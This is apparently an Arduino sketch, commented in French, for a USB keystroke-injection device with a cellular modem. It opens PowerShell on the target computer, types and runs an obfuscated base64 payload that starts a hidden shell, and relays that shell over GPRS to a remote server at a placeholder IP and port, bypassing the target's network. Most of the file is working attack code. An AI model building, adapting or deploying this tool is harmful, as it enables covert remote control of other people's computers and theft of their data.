#include <KeyboardAzertyFr.h>//bibliothèque permettant d'écrire su l'ordinateur cible an tant que clavier

#include "Adafruit_FONA.h" //Bibliothèque du fona 
#define FONA_RST 4

HardwareSerial *fonaSerial = &Serial1; //Le fona est branché sur les pins 0 et 1, soit le port série 1
Adafruit_FONA fona = Adafruit_FONA(FONA_RST);

void typeKey(uint8_t key) { //fonction d'appui sur une touche 
  KeyboardAzertyFr.press(key);
  delay(50);
  KeyboardAzertyFr.release(key);
}



void setup()
{ 
  KeyboardAzertyFr.begin();
  //char fonaNotificationBuffer[64];
  //char smsBuffer[150];
  Serial.begin(230400);// initialisation des liaison séries (liaison de debug) 
  SerialUSB.begin (230400); // initialisation de la liaison avec l'ordinateur
  fonaSerial->begin(115200);//Initialisationde la liaison avec le FONA 
  if (! fona.begin(*fonaSerial)) { // début de la communication avec le FONA
    Serial.println(F("NO SIM800!"));
    while (1);
  }
  while(true){
    int i = fona.getNumSMS(); //recupération du nombre de SMS
    Serial.print(F("Number of SMS: "));
    Serial.println(i);
    if(i != -1){
      Serial.println(F("\n\rDeleting SMS...")); 
      delay(500);
      if(fona.sendCheckReply(F("AT+CMGDA=\"DEL ALL\"\r\n"), F("OK"), 100)){ //effacement des sms en mémoire 
        break;
      }
    }
    if(i==0) break;
    delay(500);
  }
  fona.sendCheckReply(F("AT+CIPMODE=1"),F("OK"),100);

  fona.setGPRSNetworkSettings(F("orange"), F("orange"), F("orange"));//configuration de l'APN (nom, utilisateur, mot de passe)
         
  if (!fona.enableGPRS(true)) //activation du GPRS
    Serial.println(F("Failed to turn on"));
 fona.sendCheckReply(F("AT+CGATT?"),F("OK"),100);// vérification de l'état du GPRS
  
 fona.sendCheckReply(F("AT+CIICR"),F("OK"),100);// 

 fona.sendCheckReply(F("AT+CIFSR"),F("OK"),100);// récupération de l'adresse ip locale de la carte
 
 delay(100);
 //####################################################### ENTER YOUR IP ADDRESS AND ITS PORT HERE!###################################
 //#                                                                                                                                 #
 //###################################################################################################################################
 if(!fona.sendCheckReply("AT+CIPSTART=\"TCP\",\"<IP>\",\"<PORT>\"",F("OK"),100))// connection au Serveur distant 
    while(1);

 KeyboardAzertyFr.press(KEY_LEFT_GUI);
   delay(50);
   KeyboardAzertyFr.press((char) 114); //In Decimal, is r
   KeyboardAzertyFr.releaseAll();
   delay(1000);
   KeyboardAzertyFr.print("powershell"); // ouverture powershell 
   typeKey(KEY_RETURN);
   delay(1000);
   //camoufl(); //payload voir annexe 
    KeyboardAzertyFr.print("$encoded=\"JHB0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3M7JGl0ID0gJHB0LlN0YXJ0SW5mbzskaXQuQ3JlYXRlTm9XaW5kb3cgPSAkdHJ1ZTskaXQuVXNlU2hlbGxFeGVjdXRlID0gJGZhbHNlOyRpdC5SZWRpcmVjdFN0YW5kYXJkSW5wdXQgPSAkdHJ1ZTskaXQuUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9ICR0cnVlOyRpdC5SZWRpcmVjdFN0YW5kYXJkRXJyb3IgPSAkdHJ1ZTskaXQuRmlsZU5hbWUgPSAicG93ZXJzaGVsbC5leGUiOyRudWxsID0gJHB0LlN0YXJ0KCk7JGN0PSRwdC5TdGFuZGFyZElucHV0OyRzdD0kcHQuU3RhbmRhcmRPdXRwdXQ7JGN0LldyaXRlTGluZSgiIGAkYz0oZ3dtaSBXaW4zMl9TZXJpYWxQb3J0fFdoZXJlLU9iamVjdHtgJF8uUE5QRGV2aWNlSUQgLW1hdGNoIGAiSURfMjM0MSZQSURfODA0RGAifSkuRGV2aWNlSUQ7YCRwbz1uZXctT2JqZWN0IFN5c3RlbS5JTy5Qb3J0cy5TZXJpYWxQb3J0IGAkYywyMzA0MDAsTm9uZSw4LG9uZTtgJHBvLm9wZW4oKTtgJHAgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcztgJGkgPSBgJHAuU3RhcnRJbmZvO2AkaS5DcmVhdGVOb1dpbmRvdyA9IGAkdHJ1ZTtgJGkuVXNlU2hlbGxFeGVjdXRlID0gYCRmYWxzZTtgJGkuUmVkaXJlY3RTdGFuZGFyZElucHV0ID0gYCR0cnVlO2AkaS5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gYCR0cnVlO2AkaS5SZWRpcmVjdFN0YW5kYXJkRXJyb3IgPSBgJHRydWU7YCRpLkZpbGVOYW1lID0gYCJwb3dlcnNoZWxsLmV4ZWAiO2AkbnVsbCA9IGAkcC5TdGFydCgpO2AkYz1gJHAuU3RhbmRhcmRJbnB1dDtgJHM9YCRwLlN0YW5kYXJkT3V0cHV0O3doaWxlKDEpe2RvIHtgJGRlPVtjaGFyXWAkcy5SZWFkKCk7YCRwby5Xcml0ZShgJGRlKTt9IHdoaWxlIChgJGRlIC1uZSBgIj5gIik7YCRjLldyaXRlTGluZShgJHBvLlJlYWRMaW5lKCkpfSIpIA==\"");
  typeKey(KEY_RETURN);
  KeyboardAzertyFr.print("$dec = ");
  KeyboardAzertyFr.press(0x86);
  KeyboardAzertyFr.press('(');
  delay(50);
  KeyboardAzertyFr.releaseAll();
  KeyboardAzertyFr.print("System.Text.Encoding");
  KeyboardAzertyFr.press(0x86);
  KeyboardAzertyFr.press(')');
  delay(50);
  KeyboardAzertyFr.releaseAll();
  KeyboardAzertyFr.print("::UTF8.GetString(");
  KeyboardAzertyFr.press(0x86);
  KeyboardAzertyFr.press('(');
  delay(50);
  KeyboardAzertyFr.releaseAll();
  KeyboardAzertyFr.print("System.Convert");
  KeyboardAzertyFr.press(0x86);
  KeyboardAzertyFr.press(')');
  delay(50);
  KeyboardAzertyFr.releaseAll();
  KeyboardAzertyFr.print("::FromBase64String($encoded))");
  typeKey(KEY_RETURN);
  KeyboardAzertyFr.print("Invoke-Expression $dec");
  typeKey(KEY_RETURN);
  //KeyboardAzertyFr.print("exit");
  typeKey(KEY_RETURN);
 fonaSerial->readString();
  
}

void loop()
{
  if (fonaSerial->available()) //si données dispo sur liaison fona/carte
   {
    
    Serial.print("reçu");
    delay( 1000);  
    String d=fonaSerial->readStringUntil('\n'); // lecture des données 
    Serial.print(d);
    char v[d.length()];// conversion de string en char[]
    strcpy(v, d.c_str());
    SerialUSB.write(v); // ecriture des données sur la liaison série de l'ordinateur 
    SerialUSB.write("\n");
    

 
   }
   
   if (SerialUSB.available()) // si données dispo sur liaison Carte/ordinateur 
   {
    
    
    String BypassAirGap = SerialUSB.readStringUntil('\n'); // lecture des données proventant de l'ordinateur cible // accélération possible 
    Serial.print(BypassAirGap);// affichage de =s données lues (debug)
    char p[BypassAirGap.length()];// conversion de string en char[]
    strcpy(p, BypassAirGap.c_str());
    //fonaSerial->write("AT+CIPSEND");
    delay (500);
    //fona.sendCheckReply(F("AT+CIPSEND"),F(">"),100);//envoi de la commande d'envoi et attente de la reponse du fona
    //indiquant qu'elle est prête 
    fonaSerial->write(p);// transmission des données vers le FONA 
    fonaSerial->write("\n");
    //fonaSerial->write(0x1a);//envoi des données 
    delay (100);
    //Serial.print(fonaSerial->readString());//attente du "send ok"


   }
}
